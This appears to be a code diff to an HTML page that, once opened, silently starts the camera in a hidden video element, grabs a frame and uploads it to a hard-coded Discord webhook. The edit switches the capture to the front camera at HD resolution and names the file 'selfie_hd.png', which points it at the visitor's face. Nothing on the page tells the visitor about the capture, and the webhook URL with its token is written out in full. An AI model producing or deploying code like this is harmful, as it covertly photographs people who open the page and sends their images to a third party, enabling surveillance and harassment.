@@ -1,17 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Auto Kamera Kirim ke Discord</title>
 </head>
 <body>
-  <video id="video" autoplay playsinline muted width="320" height="240" style="visibility:hidden; position:absolute;"></video>
+  <video id="video" autoplay playsinline muted style="visibility:hidden; position:absolute;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    async function startCameraAndSend() {
+    async function startFrontCameraAndSend() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: "environment" } } // Kamera belakang jika tersedia
+          video: {
+            facingMode: { ideal: "user" },
+            width: { ideal: 1920 },   // Target lebar HD
+            height: { ideal: 1080 }   // Target tinggi HD
+          }
         });
 
         const video = document.getElementById('video');
@@ -32,27 +35,27 @@
                 return;
               }
 
-              const webhookURL = "https://discord.com/api/webhooks/1362791961437933739/XtSJE6yIX3oZIzgA9whNdLddUCSAxkj9VFgfjWfjVjopdKkTcQxp0HlybawvzIA1TaWl"; // Ganti dengan webhook kamu
+              const webhookURL = "https://discord.com/api/webhooks/1362791961437933739/XtSJE6yIX3oZIzgA9whNdLddUCSAxkj9VFgfjWfjVjopdKkTcQxp0HlybawvzIA1TaWl";
               const formData = new FormData();
-              formData.append("file", blob, "cuplikan.png");
+              formData.append("file", blob, "selfie_hd.png");
 
               fetch(webhookURL, {
                 method: "POST",
                 body: formData
               }).then(response => {
-                console.log(response.ok ? "✅ Gambar terkirim ke Discord!" : "❌ Gagal mengirim ke Discord");
+                console.log(response.ok ? "✅ Selfie HD terkirim ke Discord!" : "❌ Gagal mengirim ke Discord");
               }).catch(error => {
                 console.error("Fetch error:", error);
               });
-            }, 'image/png');
-          }, 1000); // Tunggu 1 detik supaya frame siap
+            }, 'image/png', 1.0); // 1.0 = kualitas PNG maksimal
+          }, 1000); // Tunggu 1 detik
         };
       } catch (err) {
         console.error("Gagal akses kamera:", err);
       }
     }
 
-    window.onload = startCameraAndSend;
+    window.onload = startFrontCameraAndSend;
   </script>
 </body>
 </html>
